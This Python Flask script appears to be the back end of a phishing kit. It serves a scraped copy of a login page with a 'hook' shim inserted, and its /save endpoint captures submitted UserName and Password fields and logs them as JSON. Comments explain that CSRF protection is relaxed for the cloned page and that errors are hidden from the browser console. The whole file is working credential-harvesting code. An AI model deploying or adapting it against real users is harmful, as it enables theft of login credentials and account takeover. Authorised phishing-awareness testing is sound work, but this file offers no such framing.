from __future__ import print_function
from flask import Flask, render_template, request, json
from jinja2 import FileSystemLoader

import sys


app = Flask(__name__)
hook_shim_file="./hook.shim"

@app.route('/')
def show_index():

    hook_blob = []
    try:
       with open (hook_shim_file, "r") as shim:
          hook_blob=shim.readlines()
    except EnvironmentError: # parent of IOError, OSError *and* WindowsError where available
       print("Shim file error", file=sys.stderr)

    return render_template('index.html', hook_blob=hook_blob)

# Expected and accepted form parameters
wFormFields = {'UserName': '', 'Password' : ''}

# We are not injecting CSRFs into our own scraped page, so relax the requirement
# If we need to we can bring in CSRFProtect and then exclude routed as needed
# Ex:
# from flask_wtf.csrf import CSRFProtect
# csrf = CSRFProtect(app)
# @csrf.exempt

@app.route("/save",  methods=['POST'])
def save_data():
    for field in wFormFields.keys(): 

       # Populate JSON data bag so you can extract relevant field easy.
       # Check if what is being submitted is what you want 
       if field in request.form:
          for field in wFormFields.keys(): 
             wFormFields[field]=request.form[field]

          print(json.dumps(wFormFields))
          return '', 200
       else:
          print("check form parameters accepted: %s" % (json.dumps(request.form)), file=sys.stderr)
          return '', 400
    
    return '', 200 # We want to be quiet in browser console even if unknown error occurs, change to 400 to debug

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=8000)

